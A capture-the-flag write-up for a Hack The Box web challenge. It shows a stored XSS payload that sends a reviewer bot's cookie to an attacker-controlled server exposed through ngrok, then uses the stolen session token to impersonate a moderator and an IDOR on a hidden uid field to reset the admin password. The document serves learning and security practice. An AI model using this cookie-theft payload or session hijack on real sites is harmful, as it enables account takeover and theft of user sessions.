# Kryptos Support
### web | 300 points | 1066 solves

## Description
The secret vault used by the Longhir's planet council, Kryptos, contains some very sensitive state secrets that Virgil and Ramona are after to prove the injustice performed by the commission. Ulysses performed an initial recon at their request and found a support portal for the vault. Can you take a look if you can infiltrate this system?

## First Impressions

The website has a text field to enter any issues for the Kryptos Support Vault. Text fields in the case of CTFs are generally prone to XSS or Cross-Site Scripting, so that is one direction this challenge could go in.

![](images/kryptos-website.png)

The challenge doesn't come with any downloadable files, so we have to rely on the source code in this case. On further inspection of the HTML code, I noticed a link to `/login`. The `BACKEND` button is visible on the website but it is not clickable.

![](images/kryptos-backend.png)

The login page has fields for the username and password. With login fields, SQL injections are also possible. 

![](images/kryptos-login.png)

On further inspection into the javascript code for this page, we see that if the login is successful, it redirects to `/tickets`, which is where the text we enter on the main page is displayed.

![](images/kryptos-loginjs.png)

Typing `/tickets` in the URL directly redirects back to the home page. So the only way we can access the tickets page is through a valid username and password.

## Solution

The main hurdle for this challenge was that it didn't have any downloadable files showing the backend. The backend code helps to know at where exactly the flag is. After trying a SQL injection techniques to no avail, I reached out to one of the admins for a nudge

>a "user" reviews your tickets
>that's CTF slang for there's a browser looking at your input
>that's everything you have to know for the first part of the challenge

This immediately reminded me of a tutorial for another challenge I'd seen, [Toy Workshop from HTB Cyber Santa CTF 2021](https://www.youtube.com/watch?v=20FkOdoMiRU&t=65s). The text entered in the form is reviewed by a JS bot that processes the entry and stores it in a database. The flag was stored as a cookie, and by entering a payload within script tags, the cookie could be retrieved.

We don't know if the flag is in the cookie or not, but we can try to retrieve the cookie and see if we get any important details from it.

The setup to retrieve the cookie was done in a very similar way to the link mentioned above. Firstly, I set up a http server using python, where I can see the cookie.

```bash
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/)
```

Since this is a local server, I need a way to have this server accessible on the internet. Ngrok is a tool that allows us to do this easily.

```bash
ngrok http 80
```

![](images/kryptos-ngrok.png)

The URL next to the `Forwarding` field can be used as the URL in the payload. The payload I used comes from [this link](https://github.com/R0B1NL1N/WebHacking101/blob/master/xss-reflected-steal-cookie.md)

```html
<script>var i=new Image;i.src="http://192.168.0.18:8888/?"+document.cookie;</script>
```

![](images/kryptos-payload.png)

On submitting this payload, our HTTP server shows the following output:

```bash
127.0.0.1 - [19/May/2022 15:43:04] "GET /session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCj9.eyJ1c2VybmFtZSI6Im1vZGVyYXRvciIsInVpZCI6MTAwLCJpYXQi0jE2NTI5NjA10DR9.Y5pT22Ic1jpBeMk1xWOsK8W¡0iKAZfC3uvz9dp8H-ac HTTP/1.1"200 -
```

There is a cookie! And it's stored in the form of a JWT token. After entering this token on [jwt.io](jwt.io), we see that this is a login cookie for a user named `moderator`.

![](images/kryptos-jwt.png)

It took me a while to figure out what to do with this token, until I eventually realized that I could impersonate the `moderator` user by entering this cookie in my browser.

![](images/kryptos-cookie.png)

Once that was done, entering `/tickets` in the URL got me to the tickets page! It worked!

![](images/kryptos-tickets.png)

I expected the flag to be somewhere here, however it looks like the challenge is not done yet.

![](images/kryptos-settings.png)

The settings page allows the user to reset their password. When I sent the ticket earlier, the message `An admin will review your ticket shortly` displayed after submitting. So maybe this page will help get admin access? Let's check the source code.

![](images/kryptos-settingscode.png)

A field named uid, interesting! This is the same field mentioned in the cookie from earlier. So this changes the password depending on the user id. Even though it is a hidden field, we can change the value in the Web Inspector. The `uid` for the `admin` user would usually be either 0 or 1. After trying both, the `uid` of 1 worked!

![](images/kryptos-uid.png)

Then we log in using admin as the username and password, and we have our flag! I found out after the CTF that this an IDOR (Insecure Direct Object Reference) vulnerability, cool stuff!

![](images/kryptos-adminlogin.png)

![](images/kryptos-flag.png)

Flag: `HTB{x55_4nd_id0rs_ar3_fun!!}`